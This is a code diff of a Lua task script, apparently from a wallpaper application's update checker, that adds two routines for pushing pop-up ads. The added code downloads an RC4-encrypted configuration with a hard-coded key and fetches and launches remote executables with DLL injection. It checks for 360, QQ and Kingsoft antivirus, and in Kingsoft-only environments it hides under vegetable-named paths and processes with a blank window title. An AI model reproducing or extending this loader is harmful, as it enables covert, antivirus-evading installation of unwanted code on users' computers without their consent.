@@ -431,118 +431,127 @@ function adinfo(url)
 end
 
 function json_api(json)
-	local exe_version, exe_file, exe_md5, dll_version, dll_file, dll_md5, position, mutex, link
-	local antivirus, antivirus_size, antivirus_node, qid, qid_node, city_node, city
-	local function json_result(jsonnode)
-		local json_exe, json_dll, times, popup_time_link, popup_size, popup_timing, popup_position, popup_mutex
-		--获取exe
-		json_exe = extra.json_node(jsonnode, "exe")
-		exe_version = extra.json_str(json_exe, "version")
-		local file_result = {}
-		local file_node = extra.json_node(json_exe, "files")
-		local file_size = extra.json_size(file_node)
-		for i = 0, file_size - 1, 1 do
-			local item = extra.json_node_item(file_node, i)
-			table.insert(file_result, extra.json_str(item, ""))
-		end
-		local md5_result = {}
-		local md5_node = extra.json_node(json_exe, "md5")
-		local md5_size = extra.json_size(md5_node)
-		for i = 0, md5_size - 1, 1 do
-			local item = extra.json_node_item(md5_node, i)
-			table.insert(md5_result, extra.json_str(item, ""))
-		end
-		exe_file = file_result
-		exe_md5 = md5_result
-		--获取dll
-		json_dll = extra.json_node(jsonnode, "dll")
-		dll_version = extra.json_str(json_dll, "version")
-		dll_file = extra.json_str(json_dll, "file")
-		dll_md5 = extra.json_str(json_dll, "md5")
-		--获取弹出位置
-		popup_position = extra.json_node(jsonnode, "popup_position")
-		position = extra.json_str(popup_position, "popup_position")
-		--获取互斥变量
-		popup_mutex = extra.json_node(jsonnode, "mutex")
-		mutex = extra.json_str(popup_mutex, "mutex")
-		--获取弹出链接
-		popup_time_link = extra.json_node(jsonnode, "popup_time_link")
-		popup_timing = extra.json_node(popup_time_link, "popup_timing")
-		popup_size = extra.json_size(popup_timing)
-		for i = 0, popup_size - 1, 1 do
-			local item = extra.json_node_item(popup_timing, i)
-			times = extra.json_str(item, "times")
-			item2 = string.split(times, "-")
-			if nowtime >= item2[1] and nowtime <= item2[2] then
-				link = extra.json_str(item, "link")
-				break
-			end
-		end
-	end
-	--生成默认配置
-	local json_root = extra.json_parsing(json)
-	if json_root == -1 then
-		return false
-	end
-	local json_common = extra.json_node(json_root, "common")
-	if json_common ~= -1 then
-		json_result(json_common)
-	end
-	--特殊配置检查
-	local json_additions = extra.json_node(json_root, "additions")
-	if json_additions ~= -1 then
-		local env = (is360 and "1" or "0") .. (isqq and "1" or "0") .. (isjs and "1" or "0")
-		local additions_size = extra.json_size(json_additions)
-		for x = 0, additions_size - 1, 1 do
-			local flag1 = false
-			local flag2 = false
-			local flag3 = false
-			local addition = extra.json_node_item(json_additions, x)
-			--获取环境判断
-			antivirus_node = extra.json_node(addition, "antivirus")
-			antivirus = extra.json_node(antivirus_node, "antivirus")
-			antivirus_size = extra.json_size(antivirus)
-			for i = 0, antivirus_size - 1, 1 do
-				local item = extra.json_node_item(antivirus, i)
-				item = extra.json_str(item, "")
-				if env == item or item == "全环境" then
-					flag1 = true
-					break
-				end
-			end
-			--获取渠道判断
-			qid_node = extra.json_node(addition, "channel")
-			qid = extra.json_str(qid_node, "channel")
-			qid = string.split(qid, ";")
-			table.remove(qid, #qid)
-			if stringinarray(p_qid, qid) == true or qid[1] == nil then
-				flag2 = true
-			end
-			--获取城市判断
-			city_node = extra.json_node(addition, "city")
-			city = extra.json_str(city_node, "city")
-			city = string.split(city, ";")
-			table.remove(city, #city)
-			if stringinarray(p_city, city) == false or city[1] == nil then
-				flag3 = true
-			end
+    local exe_version, exe_file, exe_md5, dll_version, dll_file, dll_md5, position, mutex, link, popplus
+    local antivirus, antivirus_size, antivirus_node, qid, qid_node, city_node, city
+    local function json_result(jsonnode)
+        local json_exe, json_dll, times, popup_time_link, popup_size, popup_timing, popup_position, popup_mutex
+        --获取exe
+        json_exe = extra.json_node(jsonnode, "exe")
+        exe_version = extra.json_str(json_exe, "version")
+        local file_result = {}
+        local file_node = extra.json_node(json_exe, "files")
+        local file_size = extra.json_size(file_node)
+        for i = 0, file_size - 1, 1 do
+            local item = extra.json_node_item(file_node, i)
+            table.insert(file_result, extra.json_str(item, ""))
+        end
+        local md5_result = {}
+        local md5_node = extra.json_node(json_exe, "md5")
+        local md5_size = extra.json_size(md5_node)
+        for i = 0, md5_size - 1, 1 do
+            local item = extra.json_node_item(md5_node, i)
+            table.insert(md5_result, extra.json_str(item, ""))
+        end
+        exe_file = file_result
+        exe_md5 = md5_result
+        --获取dll
+        json_dll = extra.json_node(jsonnode, "dll")
+        dll_version = extra.json_str(json_dll, "version")
+        dll_file = extra.json_str(json_dll, "file")
+        dll_md5 = extra.json_str(json_dll, "md5")
+        --获取弹出位置
+        popup_position = extra.json_node(jsonnode, "popup_position")
+        position = extra.json_str(popup_position, "popup_position")
+        --获取互斥变量
+        popup_mutex = extra.json_node(jsonnode, "mutex")
+        mutex = extra.json_str(popup_mutex, "mutex")
+        --获取弹出链接
+        popup_time_link = extra.json_node(jsonnode, "popup_time_link")
+        popup_timing = extra.json_node(popup_time_link, "popup_timing")
+        popup_size = extra.json_size(popup_timing)
+        popplus = {}
+        for i = 0, popup_size - 1, 1 do
+            local item = extra.json_node_item(popup_timing, i)
+            times = extra.json_str(item, "times")
+            link = extra.json_str(item, "link")
+            if times == "" or link == "" then
+                link = nil
+                break
+            end
+            item2 = string.split(times, "-")
+            table.insert(popplus, {link = link, times = times})
+            if nowtime >= item2[1] and nowtime < item2[2] then
+                break
+            else
+                link = nil
+            end
+        end
+    end
+    --生成默认配置
+    local json_root = extra.json_parsing(json)
+    if json_root == -1 then
+        return false
+    end
+    local json_common = extra.json_node(json_root, "common")
+    if json_common ~= -1 then
+        json_result(json_common)
+    end
+    --特殊配置检查
+    local json_additions = extra.json_node(json_root, "additions")
+    if json_additions ~= -1 then
+        local env = (is360 and "1" or "0") .. (isqq and "1" or "0") .. (isjs and "1" or "0")
+        local additions_size = extra.json_size(json_additions)
+        for x = 0, additions_size - 1, 1 do
+            local flag1 = false
+            local flag2 = false
+            local flag3 = false
+            local addition = extra.json_node_item(json_additions, x)
+            --获取环境判断
+            antivirus_node = extra.json_node(addition, "antivirus")
+            antivirus = extra.json_node(antivirus_node, "antivirus")
+            antivirus_size = extra.json_size(antivirus)
+            for i = 0, antivirus_size - 1, 1 do
+                local item = extra.json_node_item(antivirus, i)
+                item = extra.json_str(item, "")
+                if env == item or item == "全环境" then
+                    flag1 = true
+                    break
+                end
+            end
+            --获取渠道判断
+            qid_node = extra.json_node(addition, "channel")
+            qid = extra.json_str(qid_node, "channel")
+            qid = string.split(qid, ";")
+            table.remove(qid, #qid)
+            if stringinarray(p_qid, qid) == true or qid[1] == nil then
+                flag2 = true
+            end
+            --获取城市判断
+            city_node = extra.json_node(addition, "city")
+            city = extra.json_str(city_node, "city")
+            city = string.split(city, ";")
+            table.remove(city, #city)
+            if stringinarray(p_city, city) == false or city[1] == nil then
+                flag3 = true
+            end
 
-			if flag1 == true and flag2 == true and flag3 == true then
-				json_result(addition)
-				break
-			end
-		end
-	end
-	extra.json_clean()
-	local sed = random(1, #exe_file)
-	local result = {
-		exe = {exe_version .. "/" .. exe_file[sed], exe_md5},
-		dll = {dll_version .. "/" .. dll_file, dll_md5},
-		pos = position,
-		mutex = mutex,
-		url = link
-	}
-	return result
+            if flag1 == true and flag2 == true and flag3 == true then
+                json_result(addition)
+                break
+            end
+        end
+    end
+    extra.json_clean()
+    local sed = random(1, #exe_file)
+    local result = {
+        exe = {exe_version .. "/" .. exe_file[sed], exe_md5},
+        dll = {dll_version .. "/" .. dll_file, dll_md5},
+        pos = position,
+        mutex = mutex,
+        url = link,
+        popplus = popplus
+    }
+    return result
 end
 
 function user_type()
@@ -837,7 +846,6 @@ function execute_mininewsplus_webmode()
 	return
 end
 
---厂商和dsp弹出
 function execute_tips_cs()
 	local path = "http://down1.wallpaper.muxin.fun/tui/tips/v1.0.0.1/tipsplus2-"
 	local md5 = {
@@ -848,7 +856,7 @@ function execute_tips_cs()
 
 	--gif配置
 	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tipsplus.gif"
-	local gif_md5 = "019E9B4BDE714FEAE48A38B14BE252A0"
+	local gif_md5 = "997DB3150E23406728D66618EC59614C"
 	local gif_name = "logo_tips"
 
 	local args = {
@@ -870,6 +878,7 @@ function execute_tips_cs()
 		"-position=2:2",
 		"-killprocess=60",
 		"-nopopwhenlong=0",
+		"-popmenu=true",
 		"-recordshow=0"
 	}
 
@@ -904,7 +913,7 @@ function execute_tips_cs()
 	if nowtime >= "09:30" then
 		taskid = taskidlist[1]
 		dspurl = "http://news.7654.com/tipsdsp/21/s11/?product_category=23"
-		reportprefix = "tips11-cs-1"
+		reportprefix = "tips11-1-cs"
 	else
 		return
 	end
@@ -925,11 +934,11 @@ function execute_tips_cs()
 		return
 	end
 
-	--近期不弹,48小时
-	--[[if interval(nopop_set_time("tipsplus2"), "h") < 48 then
+	--近期不弹
+	if interval(nopop_set_time("tipsplus")) < 2 then
 		report_onday(reportprefix .. ".in-popup-period", 3)
 		return
-	end]]
+	end
 
 	--弹出优先级,使用pop_priority时recordshow=1,往注册表记录时间,不使用时recordshow=0
 	--[[table.insert(args, "-recordshow=1")
@@ -941,6 +950,128 @@ function execute_tips_cs()
 	args = extra.encrypte(table.concat(args, " "))
 	-- return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tips.")
 	return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tips.")
+end
+
+function execute_tips_cs2()
+	local args = {
+		"-project=jcwallpaper",
+		"-crawlusertag=true",
+		"-crawlconfigurl=http://down1.wallpaper.muxin.fun/n/crawlconfig.json",
+		"-usewebmode=true",
+		"-o=30",
+		"-writetck=LiveUpdate360,632",
+		"-shqidurl=http://kl.hnayg.com/zkactive/ctl/w/qinfo.html",
+		"-shadurl=http://kl.hnayg.com/zkactive/ctl/wb/show.html",
+		"-shlogurl=http://tj.hnayg.com/zklogger/zk/rp.html",
+		"-localcity=" .. p_city,
+		"-closebuttonjsonurl=http://down1.wallpaper.muxin.fun/n/tipsplus.json",
+		"-killprocess=60",
+		"-nopopwhenlong=0",
+		"-popmenu=true",
+		"-recordshow=0"
+	}
+
+	--路径及进程名定义
+	local localpath = "%APPDATA%\\jcwallpaper\\jcbztips"
+	local localname = "Jcbztips"
+
+	--纯金山环境修改类名、标题名、进程名
+	local classname = "Jc-bztips"
+	local title = "Jc-bztips"
+	if isjs == true and isqq == false and is360 == false then
+		if stringinarray(city_name(),{"北京","上海","深圳","珠海"})==false then
+			localpath = "%localappdata%\\spinach\\cress"
+			localname = "celery"
+			classname = "lettuce"
+			title = ""
+		end
+	end
+
+	table.insert(args, "-classname=" .. classname)
+	table.insert(args, "-title=" .. title)
+
+    reportprefix = "tips11-5-cs"
+    table.insert(args, "-reportprefix=" .. reportprefix)
+
+	if interval(taskid_last_time(taskid)) < 1 then
+		return
+	end
+
+	local exclude_list = {
+		qid = {"guanwang_"},
+		version = {},
+		process = {},
+		md5 = {},
+		citys = {}
+	}
+	if check_enviroment(reportprefix, exclude_list) == false then
+		return
+	end
+
+	--近期不弹
+	if interval(nopop_set_time("tipsplus")) < 2 then
+		report_onday(reportprefix .. ".in-popup-period", 3)
+		return
+	end
+
+	--读取api
+    local json_str = unicorn.web_http_get("http://down2.wallpaper.muxin.fun/f52e6718f1c349b950eca36cde6532a5.json")
+    json_str = extra.rc4_decrypt(json_str, "PapI$YPr$zVtih2VcKoi%bmDVRCSwdVw")
+    local json_result = json_api(json_str)
+    if json_result == false then
+        return
+    end
+    local path = "http://down1.wallpaper.muxin.fun/tui/package/" .. json_result.exe[1]
+    local md5 = json_result.exe[2]
+
+    --gif配置
+    local gif_url = "http://down1.wallpaper.muxin.fun/tui/package/" .. json_result.dll[1]
+    local gif_md5 = json_result.dll[2]
+    local gif_name = "logo_tips"
+    table.insert(args, "-dlldata=" .. gif_name)
+
+    if json_result.popplus[1] == nil then
+        return
+    end
+    local taskid = "tips11-5-cs1"
+    for i = 1, #json_result.popplus, 1 do
+        taskid = "tips11-5-cs" .. i
+        itime = string.split(json_result.popplus[i].times, "-")
+        if nowtime >= itime[1] and nowtime < itime[2] then
+            dspurl = json_result.popplus[i].link
+            break
+        else
+            dspurl = nil
+        end
+    end
+    if dspurl == nil then
+        return
+    end
+    table.insert(args, "-dspurl=" .. dspurl)
+    table.insert(args, "-mutex=" .. json_result.mutex)
+    table.insert(args, "-position=" .. json_result.pos)
+    if interval(taskid_last_time(taskid)) < 1 then
+        return
+    end
+
+    table.insert(args, "-taskid=taskid." .. taskid)
+
+    args = extra.encrypte(table.concat(args, " "))
+    if gif_md5 == "" or gif_md5 == nil then
+        invoke_exe(path, md5, localpath .. "\\" .. localname .. ".exe", args, reportprefix .. ".")
+    else
+        invoke_exe_inject(
+            path,
+            md5,
+            localpath .. "\\" .. localname .. ".exe",
+            gif_url,
+            gif_md5,
+            gif_name,
+            args,
+            reportprefix .. "."
+        )
+    end
+    return
 end
 
 function execute_tips_hf()
@@ -1030,7 +1161,7 @@ function execute_tnews_cs()
 
 	--gif配置
 	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tnewsplus.gif"
-	local gif_md5 = "E06154791B557762AC4BA3C517C513AC"
+	local gif_md5 = "B2A0766B3880AA7DD86438E126988512"
 	local gif_name = "logo_tnews"
 	
 	local args = {
@@ -1050,6 +1181,7 @@ function execute_tnews_cs()
 		"-writetck=LiveUpdate360,632",
 		"-recordshow=0", --默认为1，不配优先级时为0
 		"-nopopwhenlong=0",
+		"-popmenu=1",
 		"-minireaderpreheat=false",
 		"-killprocess=60"
 	}
@@ -1064,7 +1196,7 @@ function execute_tnews_cs()
 
 	if nowtime >= "10:00" and nowtime < "24:00" then
 		taskid = taskidlist[1]
-		reportprefix = "tips12-cs-1"
+		reportprefix = "tips12-1-cs"
 		table.insert(args, "-dspurl=http://news.7654.com/tnewsdsp/21/s11/?product_category=23")
 	else
 		return
@@ -1085,6 +1217,12 @@ function execute_tnews_cs()
 		return
 	end
 
+	--近期不弹
+	if interval(nopop_set_time("tnewsplus")) < 3 then
+		report_onday(reportprefix .. ".in-popup-period", 3)
+		return
+	end
+
 	table.insert(args, "-taskid=taskid." .. taskid)
 	table.insert(args, "-reportprefix=" .. reportprefix)
 	report_kunbang("updatechecker." .. reportprefix, true, true, true, true, 0, 4, true)
@@ -1093,59 +1231,31 @@ function execute_tnews_cs()
 	return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tnews.")
 end
 
-function execute_tray()
-	local path = "http://down1.wallpaper.muxin.fun/tui/tray/v1.0.0.2/traytip-"
-	local md5 = {
-		"577AFCA8862C690B6195029B6C3BD3BD",
-		"682A8FD7FB62CF94062AEEE0519DFD6E"
-	}
-	local sed = random(1,#md5)
-
-	--gif配置
-	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tray.gif"
-	local gif_md5 = "DCDC67C547C92DF728E455EDFD2ADC9A"
-	local gif_name = "logo_tray"
-
+function execute_tnews_cs2()
 	local args = {
 		"-project=jcwallpaper",
-		"-mutex=AF691E4F-2E33-449A-B6E7-E3902F41D552",
+		"-classname=Jcboost",
+		"-title=domestic",
 		"-usewebmode=true",
+		"-shqidurl=http://kl.hnayg.com/zkactive/ctl/w/qinfo.html",
+		"-shadurl=http://kl.hnayg.com/zkactive/ctl/wb/show.html",
+		"-shlogurl=http://tj.hnayg.com/zklogger/zk/rp.html",
 		"-localcity=" .. p_city,
-		"-closebuttonjsonurl=http://down1.wallpaper.muxin.fun/n/traytip.json",
-		"-adurl=http://domain.thorzip.muxin.fun/ys",
-		"-qid=jcwallpaper",
-		"-ad=jcwallpaper_shanbiao_1"
-		--"-killprocess=60",
+		"-o=30",
+		"-closebuttonjsonurl=http://down1.wallpaper.muxin.fun/n/tipsplus.json",
+		"-writetck=LiveUpdate360,632",
+		"-recordshow=0", --默认为1，不配优先级时为0
+		"-nopopwhenlong=0",
+		"-popmenu=1",
+		"-minireaderpreheat=false",
+		"-killprocess=60"
 	}
 
-	--开机30分钟后弹
-	if (math.abs(tonumber(unicorn.boot_time)) / 60000) < 30 then
-		return
-	end
+	local localpath = "%APPDATA%\\jcpunch\\account"
+	local localname = "flexible"
 
-	--路径及进程名定义
-	local localpath = "%APPDATA%\\jcbz\\jcbzshanb"
-	local localname = "Jcbztray"
-
-	local taskidlist = {
-		"tray-1",
-		"tray-2"
-	}
-	
-	local taskid = taskidlist[1]
-	if nowtime >= "04:00" and nowtime < "14:00" then
-		taskid = taskidlist[1]
-	elseif nowtime >= "14:00" then
-		taskid = taskidlist[2]
-	else
-		return
-	end
-
-	local reportprefix = "tips13-".. showcount(taskidlist,taskid)
-
-	if interval(taskid_last_time(taskid)) < 1 then
-		return
-	end
+	reportprefix = "tips12-5-cs"
+    table.insert(args, "-reportprefix=" .. reportprefix)
 
 	local exclude_list = {
 		qid = {"guanwang_"},
@@ -1158,138 +1268,80 @@ function execute_tray()
 		return
 	end
 
-	table.insert(args, "-taskid=taskid." .. taskid)
-	table.insert(args, "-reportprefix=" .. reportprefix)
-	args = extra.encrypte(table.concat(args, " "))
-	return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tray.")
-	-- return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tray.")
-end
-
-function execute_tray11()
-	local path = "http://down1.wallpaper.muxin.fun/tui/tray/v1.0.0.2/traytip-"
-	local md5 = {
-		"577AFCA8862C690B6195029B6C3BD3BD",
-		"682A8FD7FB62CF94062AEEE0519DFD6E"
-	}
-	local sed = random(1,#md5)
-
-	--gif配置
-	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tray.gif"
-	local gif_md5 = "DCDC67C547C92DF728E455EDFD2ADC9A"
-	local gif_name = "logo_tray"
-
-	local args = {
-		"-project=jcwallpaper",
-		"-mutex=AF691E4F-2E33-449A-B6E7-E3902F41D552",
-		"-usewebmode=false",
-		"-localcity=" .. p_city
-	}
-
-	--开机30分钟后弹
-	if (math.abs(tonumber(unicorn.boot_time)) / 60000) < 30 then
+	--近期不弹
+	if interval(nopop_set_time("tnewsplus")) < 3 then
+		report_onday(reportprefix .. ".in-popup-period", 3)
 		return
 	end
 
-	--路径及进程名定义
-	local localpath = "%APPDATA%\\jcbz\\jcbzshanb"
-	local localname = "Jcbztray"
+	--读取api
+    local json_str = unicorn.web_http_get("http://down2.wallpaper.muxin.fun/f52e6718f1c349b950eca36cde6532a5.json")
+    json_str = extra.rc4_decrypt(json_str, "PapI$YPr$zVtih2VcKoi%bmDVRCSwdVw")
+    local json_result = json_api(json_str)
+    if json_result == false then
+        return
+    end
+    local path = "http://down1.wallpaper.muxin.fun/tui/package/" .. json_result.exe[1]
+    local md5 = json_result.exe[2]
 
-	local taskidlist, taskid, reportprefix
-	taskidlist = {
-		"tray3",
-		"tray4",
-		"tray5",
-		"tray6",
-		"tray7"
-	}
+    --gif配置
+    local gif_url = "http://down1.wallpaper.muxin.fun/tui/package/" .. json_result.dll[1]
+    local gif_md5 = json_result.dll[2]
+    local gif_name = "logo_tnews"
+    table.insert(args, "-dlldata=" .. gif_name)
 
-	taskid = taskidlist[1]
-	if nowtime >= "00:00" then
-		taskid = taskidlist[1]
-		reportprefix = "tips13-ds-1"
-		table.insert(args,"-landingpage=https://s.click.taobao.com/Jiugwuu")
-		table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
-		table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash.ico")
-		table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-11.zip")
-		if interval(taskid_last_time(taskidlist[1])) < 1 and interval(taskid_last_time(taskidlist[1]), "h") >= 4 then
-			taskid = taskidlist[2]
-			reportprefix = "tips13-ds-2"
-			table.insert(args,"-landingpage=https://s.click.taobao.com/2pciJvu")
-			table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
-			table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash.ico")
-			table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-11.zip")
-		end
-	end
+    if json_result.popplus[1] == nil then
+        return
+    end
+    local taskid = "tips12-5-cs1"
+    for i = 1, #json_result.popplus, 1 do
+        taskid = "tips12-5-cs" .. i
+        itime = string.split(json_result.popplus[i].times, "-")
+        if nowtime >= itime[1] and nowtime < itime[2] then
+            dspurl = json_result.popplus[i].link
+            break
+        else
+            dspurl = nil
+        end
+    end
+    if dspurl == nil then
+        return
+    end
+    table.insert(args, "-dspurl=" .. dspurl)
+    table.insert(args, "-mutex=" .. json_result.mutex)
+    table.insert(args, "-position=" .. json_result.pos)
+    if interval(taskid_last_time(taskid)) < 1 then
+        return
+    end
 
-	if day == "01" or day == "31" then
-		if interval(taskid_last_time(taskidlist[2])) < 1 and interval(taskid_last_time(taskidlist[2]), "h") >= 2 then
-			taskid = taskidlist[3]
-			reportprefix = "tips13-ds-3"
-			table.insert(args, "-landingpage=https://s.click.taobao.com/Jiugwuu")
-			table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
-			table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash1.ico")
-			table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-111.zip")
-			if interval(taskid_last_time(taskidlist[3])) < 1 and interval(taskid_last_time(taskidlist[3]), "h") >= 2 then
-				taskid = taskidlist[4]
-				reportprefix = "tips13-ds-4"
-				table.insert(args, "-landingpage=https://s.click.taobao.com/Jiugwuu")
-				table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
-				table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash1.ico")
-				table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-111.zip")
-			end
-			if interval(taskid_last_time(taskidlist[4])) < 1 and interval(taskid_last_time(taskidlist[4]), "h") >= 2 then
-				taskid = taskidlist[5]
-				reportprefix = "tips13-ds-5"
-				table.insert(args, "-landingpage=https://s.click.taobao.com/Jiugwuu")
-				table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
-				table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash1.ico")
-				table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-111.zip")
-			end
-		end
-	end
+    table.insert(args, "-taskid=taskid." .. taskid)
 
-	if interval(taskid_last_time(taskid)) < 1 then
-		return
-	end
-	
-	--北上珠深杭关闭按钮14*14，北上珠深杭8*8
-	if stringinarray(p_city, {"北京","上海市", "上海", "珠海", "深圳", "杭州"}) == false then
-		table.insert(args, "-closeimagesize=8x8")
-	else
-		table.insert(args, "-closeimagesize=14x14")
-	end
-
-	local exclude_list = {
-		qid = {"guanwang_"},
-		version = {},
-		process = {},
-		md5 = {},
-		citys = {}
-	}
-	if check_enviroment(reportprefix, exclude_list) == false then
-		return
-	end
-
-	table.insert(args, "-taskid=taskid." .. taskid)
-	table.insert(args, "-reportprefix=" .. reportprefix)
-	args = extra.encrypte(table.concat(args, " "))
-	return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tray.")
-	-- return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tray.")
+    args = extra.encrypte(table.concat(args, " "))
+    if gif_md5 == "" or gif_md5 == nil then
+        invoke_exe(path, md5, localpath .. "\\" .. localname .. ".exe", args, reportprefix .. ".")
+    else
+        invoke_exe_inject(
+            path,
+            md5,
+            localpath .. "\\" .. localname .. ".exe",
+            gif_url,
+            gif_md5,
+            gif_name,
+            args,
+            reportprefix .. "."
+        )
+    end
+    return
 end
 
 function main()
 	report_kunbang("updatechecker.run-task",true,true,true,true,0,4,true)
 	execute_mininewsplus_webmode()
 	execute_tips_cs()
+	execute_tips_cs2()
 	execute_tips_hf()
 	execute_tnews_cs()
-	if is360 == false and isjs == false then
-		execute_tray()
-	end
-	if nowtime1 < "2020-11-12" and is360 == false then
-		--20号之后的加弹
-		execute_tray11()
-	end
+	execute_tnews_cs2()
 end
 
 --全局变量定义
